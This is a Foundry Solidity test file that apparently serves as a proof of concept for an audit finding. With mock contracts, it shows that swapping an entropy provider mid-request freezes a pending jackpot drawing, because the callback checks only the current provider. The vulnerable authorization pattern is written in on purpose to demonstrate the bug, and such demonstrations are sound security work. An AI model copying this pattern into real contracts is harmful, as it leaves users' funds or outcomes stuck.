// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

interface IEntropyConsumer {
    function entropyCallback(uint64 sequenceNumber, uint256 randomness) external;
}

contract MockEntropyProvider {
    uint64 public nextSequence;
    mapping(uint64 => address) public requester;

    function requestRandomness() external returns (uint64 seq) {
        seq = ++nextSequence;
        requester[seq] = msg.sender;
    }

    function fulfill(uint64 seq, uint256 randomness) external {
        address target = requester[seq];
        require(target != address(0), "unknown request");
        ScaledEntropyProvider(target).entropyCallback(seq, randomness);
    }
}

contract ScaledEntropyProvider {
    address public owner;
    MockEntropyProvider public entropyProvider;

    struct PendingRequest {
        address consumer;
        bool exists;
    }

    mapping(uint64 => PendingRequest) public pendingRequests;

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    constructor(address _entropyProvider) {
        owner = msg.sender;
        entropyProvider = MockEntropyProvider(_entropyProvider);
    }

    function setEntropyProvider(address _entropyProvider) external onlyOwner {
        entropyProvider = MockEntropyProvider(_entropyProvider);
    }

    function requestAndCallbackScaledRandomness(address consumer) external returns (uint64 seq) {
        seq = entropyProvider.requestRandomness();
        _storePendingRequest(seq, consumer);
    }

    function _storePendingRequest(uint64 seq, address consumer) internal {
        pendingRequests[seq] = PendingRequest({consumer: consumer, exists: true});
    }

    function entropyCallback(uint64 seq, uint256 randomness) external {
        require(msg.sender == address(entropyProvider), "only current entropy provider");
        PendingRequest memory req = pendingRequests[seq];
        require(req.exists, "no pending request");
        delete pendingRequests[seq];
        IEntropyConsumer(req.consumer).entropyCallback(seq, randomness);
    }
}

contract MockJackpotConsumer is IEntropyConsumer {
    ScaledEntropyProvider public scaledProvider;

    bool public drawingPending;
    bool public drawingFulfilled;
    uint64 public lastSequence;
    uint256 public finalRandomness;
    address public winner;

    address public alice;
    address public bob;

    constructor(address _scaledProvider, address _alice, address _bob) {
        scaledProvider = ScaledEntropyProvider(_scaledProvider);
        alice = _alice;
        bob = _bob;
    }

    function startDrawing() external {
        require(!drawingPending, "already pending");
        drawingPending = true;
        lastSequence = scaledProvider.requestAndCallbackScaledRandomness(address(this));
    }

    function entropyCallback(uint64 sequenceNumber, uint256 randomness) external override {
        require(msg.sender == address(scaledProvider), "only scaled provider");
        require(drawingPending, "no drawing pending");
        require(sequenceNumber == lastSequence, "wrong sequence");

        drawingPending = false;
        drawingFulfilled = true;
        finalRandomness = randomness;
        winner = (randomness % 2 == 0) ? alice : bob;
    }
}

contract ExploitTest is Test {
    MockEntropyProvider internal provider1;
    MockEntropyProvider internal provider2;
    ScaledEntropyProvider internal scaled;
    MockJackpotConsumer internal jackpot;

    address internal owner = address(0xA11CE);
    address internal alice = address(0xBEEF);
    address internal bob = address(0xCAFE);

    function setUp() public {
        vm.startPrank(owner);
        provider1 = new MockEntropyProvider();
        provider2 = new MockEntropyProvider();
        scaled = new ScaledEntropyProvider(address(provider1));
        jackpot = new MockJackpotConsumer(address(scaled), alice, bob);
        vm.stopPrank();
    }

    function test_exploit() public {
        // Step 1: Consumer starts a randomness-backed drawing while provider1 is active.
        vm.prank(alice);
        jackpot.startDrawing();

        uint64 seq = jackpot.lastSequence();
        assertTrue(jackpot.drawingPending(), "drawing should be pending after request");
        assertEq(address(scaled.entropyProvider()), address(provider1), "provider1 should be active initially");

        // Step 2: Owner changes the underlying entropy provider while the request is still pending.
        vm.prank(owner);
        scaled.setEntropyProvider(address(provider2));

        assertEq(address(scaled.entropyProvider()), address(provider2), "provider2 should now be active");

        // Step 3: Original provider attempts to fulfill the already-issued request.
        // This now reverts because callback authorization checks the CURRENT provider,
        // not the provider bound at request time.
        vm.expectRevert(bytes("only current entropy provider"));
        provider1.fulfill(seq, 222);

        // Assert harmful outcome: the outstanding request is frozen and drawing cannot complete.
        assertTrue(jackpot.drawingPending(), "drawing remains stuck pending");
        assertFalse(jackpot.drawingFulfilled(), "drawing should not be fulfilled");
        assertEq(jackpot.winner(), address(0), "winner should remain unset");

        // Additional proof: replacement provider cannot fulfill the old request either,
        // because it never created that sequence/request mapping.
        vm.expectRevert(bytes("unknown request"));
        provider2.fulfill(seq, 111);
    }
}